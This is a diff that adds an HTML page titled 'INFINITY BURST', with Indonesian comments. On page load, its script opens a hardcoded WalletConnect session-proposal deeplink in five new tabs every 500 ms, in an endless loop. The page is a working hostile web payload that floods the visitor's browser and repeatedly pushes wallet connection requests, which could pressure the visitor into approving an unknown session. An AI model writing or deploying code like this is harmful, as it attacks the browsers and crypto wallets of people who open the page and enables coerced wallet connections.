@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <title>FLOW WC – INFINITY BURST</title>
+</head>
+<body>
+  <script>
+    const deeplink =
+      "wc:75e7fb2068b7f9abc94761cf72e93cbbf8d1804d044f38b9b7e695b89193d421@2" +
+      "?relay-protocol=irn" +
+      "&symKey=3f316b05f1ba3bd669097bb81f16fba67c2ffb503745363e292cfbcf73ef62cc" +
+      "&methods=[wc_sessionPropose]" +
+      "&expiryTimestamp=1893456000";
+
+    function openOnce() {
+      const a = document.createElement("a");
+      a.href = deeplink;
+      a.target = "_blank";
+      a.rel = "noopener noreferrer";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+
+    function burst() {
+      // 5 tab per siklus
+      for (let i = 0; i < 5; i++) {
+        setTimeout(openOnce, i * 80);
+      }
+      // ulangi terus
+      setTimeout(burst, 500);
+    }
+
+    // langsung jalan begitu halaman dimuat
+    window.onload = burst;
+  </script>
+</body>
+</html>
